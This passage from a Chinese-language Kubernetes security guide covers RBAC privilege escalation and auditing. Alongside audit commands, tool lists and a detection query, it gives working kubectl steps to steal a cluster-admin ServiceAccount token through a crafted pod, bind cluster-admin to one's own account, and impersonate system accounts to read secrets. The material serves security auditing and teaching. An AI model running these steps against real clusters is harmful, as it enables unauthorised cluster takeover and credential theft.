## 六、RBAC 滥用与提权攻击路径

### 6.1 六大经典提权链（无 CVE，纯配置滥用）

```
链1  pods/create → 指定任意 SA：能创建 Pod 就能指定命名空间内任意 ServiceAccount
     （含绑定了 cluster-admin 的 deployer-sa/jenkins-sa）→ 偷取其 Token 即集群接管
链2  deployments/statefulsets patch → 篡改运行中工作负载的 SA/privileged 字段 → 提权
链3  secrets get → 直接读取 Secret 中的高权 Token/凭据（TokenReview 无法拦截已签发 Token）
链4  roles/rolebindings create → 给自己/恶意 SA 绑定 admin/cluster-admin
链5  pods/exec → 进入任意容器（含特权系统 Pod：kube-proxy/cilium-agent）→ 节点沦陷
链6  nodes/proxy GET → kubelet API（见第七章，WebSocket 绕过 → 全集群 RCE）
```

```bash
# 链1 实战：创建挂载高权 SA Token 的 Pod
# 先枚举高权 SA
kubectl get serviceaccounts -A
kubectl get clusterrolebindings -o json | jq -r '.items[] | 
  select(.roleRef.name=="cluster-admin") | .subjects[]? | "\(.namespace)/\(.name)"'

# 创建 Pod 使用目标 SA
kubectl -n <ns> apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: hijack-sa
  namespace: <ns>
spec:
  serviceAccountName: <high-priv-sa>
  automountServiceAccountToken: true
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/termination-log; sleep 3600"]
EOF
kubectl -n <ns> logs hijack-sa --tail=5   # 读出 Token

# 链4 实战：创建高权 RoleBinding
kubectl create clusterrolebinding pwn-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=<ns>:<my-sa>
```

### 6.2 RBAC 审计方法论

```bash
# 全面权限盘点
kubectl auth can-i --list -n <ns>
kubectl auth can-i --list                    # 集群范围
kubectl auth can-i get secrets -n kube-system
kubectl auth can-i create pods --all-namespaces

# 高危权限自动审计（工具）
kubeaudit all -f <deployment>.yaml
kubescape scan framework nsa,mitre
rbackup / kube-forensics            # RBAC 攻击路径枚举
cdk k8s-get-secrets / kdigger        # 容器内快速验证

# 高危 RBAC 特征速查
# - cluster-admin / system:masters 绑定到业务 SA
# - 通配符 resources: ["*"] verbs: ["*"]
# - secrets get/list/watch
# - pods/exec, pods/create, pods/attach
# - nodes/proxy（GET 都危险！）
# - impersonate（模拟权限 = 提权）
# - rolebindings/clusterrolebindings create/update
# - configmaps get（可读 kubeconfig 里的凭据）
# - system:unauthenticated 组绑定（匿名访问）
```

### 6.3 高危 RBAC 细节：impersonate 与 system:masters

```bash
# impersonate 提权：拥有 impersonate 权限可模拟任意用户/组/SA
kubectl --as=system:serviceaccount:kube-system:admin get secrets -n kube-system
kubectl --as=system:masters get nodes        # system:masters 组绕过全部 RBAC

# 检测
kubectl get clusterroles -o json | jq -r '.items[] | 
  select(.rules[].resources[]?=="users" and .rules[].verbs[]?=="impersonate") | .metadata.name'
```

